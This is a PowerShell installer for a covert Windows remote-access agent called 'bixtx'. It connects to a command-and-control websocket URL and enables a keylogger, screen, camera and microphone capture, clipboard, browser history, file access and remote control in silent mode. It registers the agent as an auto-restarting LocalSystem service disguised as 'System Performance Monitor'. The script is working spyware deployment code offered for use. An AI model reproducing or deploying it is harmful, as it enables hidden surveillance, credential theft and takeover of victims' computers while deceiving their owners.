#Requires -RunAsAdministrator
# bixtx Windows Agent — Installer v4.7.2
# Usage: powershell -ExecutionPolicy Bypass -File install.ps1 -EnrollKey KEY [-C2Url WSS_URL] [-InstallDir PATH]
[CmdletBinding()]
param(
  [Parameter(Mandatory=$true)]  [string]$EnrollKey,
  [string]$C2Url      = "wss://bixtx.onrender.com/agent",
  [string]$InstallDir = "C:\ProgramData\bixtx-agent",
  [switch]$Silent
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

$AgentVersion = "4.7.2"
$ServiceName  = "bixtx-agent"
$AuditLog     = "C:\ProgramData\bixtx-installer.log"
$AgentLog     = "C:\ProgramData\bixtx-agent.log"

function Log($msg) { if (-not $Silent) { Write-Host "[BTX] $msg" } }
function Info($msg) { Write-Host "[BTX] $msg" }
function Die($msg) { Write-Error "[BTX] FATAL: $msg"; exit 1 }
function Audit($msg) {
  $entry = "$(Get-Date -Format 'yyyy-MM-ddTHH:mm:ssZ') | v$AgentVersion | $msg"
  try { Add-Content -Path $AuditLog -Value $entry -Force -ErrorAction SilentlyContinue } catch {}
  Log "AUDIT: $entry"
}

# Preflight
$nodeCmd = Get-Command node -ErrorAction SilentlyContinue
if (-not $nodeCmd) { Die "Node.js 18+ is required. Download from https://nodejs.org" }
$nodeVersion = (node -e "process.stdout.write(process.versions.node)" 2>&1)
$nodeMajor = [int]($nodeVersion -split '\.')[0]
if ($nodeMajor -lt 18) { Die "Node.js 18+ required (found v$nodeVersion)" }
$npmCmd = Get-Command npm -ErrorAction SilentlyContinue
if (-not $npmCmd) { Die "npm is required" }

Audit "INSTALL_START version=$AgentVersion platform=Windows c2=$C2Url"

# Create install directory
if (-not (Test-Path $InstallDir)) {
  New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
}

# Locate software-a source
$ScriptDir  = Split-Path $MyInvocation.MyCommand.Path
$RepoRoot   = Split-Path $ScriptDir
$AgentSrc   = Join-Path $RepoRoot "software-a"
if (-not (Test-Path $AgentSrc)) { Die "software-a source not found at $AgentSrc" }

# Copy source files
Log "Copying agent source..."
$excludes = @('install.sh','install.ps1','.env.example','.git','node_modules','tests','coverage')
Get-ChildItem -Path $AgentSrc -Recurse |
  Where-Object {
    $rel = $_.FullName.Substring($AgentSrc.Length + 1)
    $first = ($rel -split '\\')[0]
    $excludes -notcontains $first -and $first -notlike '.env*' -and $first -notlike '*.md'
  } |
  ForEach-Object {
    $dest = Join-Path $InstallDir ($_.FullName.Substring($AgentSrc.Length + 1))
    if ($_.PSIsContainer) {
      New-Item -ItemType Directory -Path $dest -Force | Out-Null
    } else {
      Copy-Item -Path $_.FullName -Destination $dest -Force
    }
  }

# Install npm dependencies
Log "Installing npm dependencies..."
Push-Location $InstallDir
try {
  & npm install --production --no-fund --no-audit 2>&1 | Write-Host
  if ($LASTEXITCODE -ne 0) { Die "npm install failed" }
} finally {
  Pop-Location
}

# Write .env
Log "Writing configuration..."
$envContent = @"
BIXTX_SERVER_URL=$C2Url
BIXTX_ENROLL_KEY=$EnrollKey
NODE_ENV=production
SILENT_MODE=true
LOG_LEVEL=warn
ENABLE_SCREEN_CAPTURE=true
ENABLE_CAMERA_ACCESS=true
ENABLE_MICROPHONE_ACCESS=true
ENABLE_KEYLOGGER=true
ENABLE_CLIPBOARD=true
ENABLE_GEOLOCATION=true
ENABLE_FILE_ACCESS=true
ENABLE_BROWSER_HISTORY=true
ENABLE_REMOTE_CONTROL=true
MUTATION_ENABLED=true
WATCHDOG_ENABLED=true
COMMAND_GUARD_ENABLED=true
"@
$envPath = Join-Path $InstallDir ".env"
Set-Content -Path $envPath -Value $envContent -Encoding UTF8
# Restrict .env to SYSTEM and Administrators only
$acl = Get-Acl $envPath
$acl.SetAccessRuleProtection($true, $false)
$adminSid  = New-Object System.Security.Principal.SecurityIdentifier "S-1-5-32-544"
$systemSid = New-Object System.Security.Principal.SecurityIdentifier "S-1-5-18"
foreach ($sid in @($adminSid, $systemSid)) {
  $rule = New-Object System.Security.AccessControl.FileSystemAccessRule(
    $sid, "FullControl", "Allow"
  )
  $acl.AddAccessRule($rule)
}
Set-Acl -Path $envPath -AclObject $acl

$mainJs = Join-Path $InstallDir "src\index.js"
if (-not (Test-Path $mainJs)) { Die "src\index.js not found after install" }

# Install as Windows Service using sc.exe
$nodePath = (Get-Command node).Source
$binPath  = "`"$nodePath`" `"$mainJs`""

Log "Registering Windows Service: $ServiceName..."
$existing = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
if ($existing) {
  Stop-Service -Name $ServiceName -Force -ErrorAction SilentlyContinue
  & sc.exe delete $ServiceName | Out-Null
  Start-Sleep 2
}

& sc.exe create $ServiceName `
  binPath= $binPath `
  start= auto `
  DisplayName= "System Performance Monitor" `
  obj= LocalSystem | Out-Null

& sc.exe description $ServiceName "Background system monitoring and telemetry service." | Out-Null
& sc.exe failure $ServiceName reset= 60 actions= restart/10000/restart/30000/restart/60000 | Out-Null

Start-Service -Name $ServiceName
Start-Sleep 3

$svc = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
if ($svc.Status -ne "Running") {
  Die "Service $ServiceName failed to start. Check Event Viewer > Windows Logs > Application."
}

Audit "INSTALL_SUCCESS service=Running"

Info "✓ bixtx Agent v$AgentVersion installed (Windows/Service)."
Info "  Service  : Get-Service -Name $ServiceName"
Info "  Event log: Get-EventLog -LogName Application -Source $ServiceName -Newest 20"
Info "  Agent log: $AgentLog"
Info "  Device will appear in dashboard within 30-60 seconds."
